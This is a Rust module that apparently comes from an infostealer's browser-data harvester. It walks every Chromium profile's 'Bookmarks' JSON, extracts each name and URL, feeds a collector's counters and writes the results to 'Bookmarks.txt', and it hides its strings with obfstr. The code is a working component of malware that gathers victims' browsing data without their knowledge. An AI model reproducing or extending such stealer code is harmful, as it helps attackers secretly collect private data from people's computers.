use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
use alloc::sync::Arc;
use alloc::vec;
use alloc::vec::Vec;
use collector::{Browser, Collector};
use json::{parse, Value};
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

pub(super) struct BookmarksTask {
    browser: Arc<BrowserData>
}

impl BookmarksTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector> Task<C> for BookmarksTask {
    parent_name!("Bookmarks.txt");

    fn run(&self, parent: &Path, collector: &C) {
        let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, read_bookmarks) else {
            return
        };

        collector.get_browser().increase_bookmarks_by(bookmarks.len());
        let _ = to_string_and_write_all(&bookmarks, "\n\n", parent);
    }
}

fn read_bookmarks(profile: &Path) -> Option<Vec<Bookmark>> {
    let content = (profile / s!("Bookmarks")).read_file().ok()?;
    let json = parse(&content).ok()?;
    
    let roots = json.get(s!("roots"))?;
    
    let bookmarks: Vec<Bookmark> = [s!("bookmark_bar"), s!("other"), s!("synced")]
        .iter()
        .filter_map(|root| roots.get(root.as_ref()))
        .flat_map(extract_bookmarks)
        .collect();
    
    Some(bookmarks)
}

fn extract_bookmarks(root: &Value) -> Vec<Bookmark> {
    let mut bookmarks = Vec::new();
    let mut stack = vec![root];

    while let Some(current) = stack.pop() {
        if let Some(obj) = current.as_object() {
            if let (Some(name_val), Some(url_val)) = (obj.get("name"), obj.get("url"))
                && let (Some(name), Some(url)) = (name_val.as_string(), url_val.as_string())
            {
                bookmarks.push(Bookmark {
                    name: name.clone(),
                    url: url.clone(),
                });
            }


            if let Some(children_val) = obj.get("children")
                && let Some(children) = children_val.as_array()
            {
                for child in children.iter().rev() {
                    stack.push(child);
                }
            }
        }
    }

    bookmarks 
}